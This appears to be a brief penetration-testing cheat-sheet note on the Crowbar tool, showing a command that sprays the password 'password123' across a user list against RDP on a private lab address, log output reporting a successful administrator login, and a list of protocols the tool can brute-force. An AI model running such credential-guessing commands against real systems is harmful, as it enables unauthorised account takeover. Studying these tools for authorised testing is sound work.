# crowbar

```shell-session
 crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

```shell-session
2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

#### Bruteforce Protocols

* openvpn
* rdp
* sshkey
* vnckey
* \[\[Remote Desktop Protocol (RDP)]]
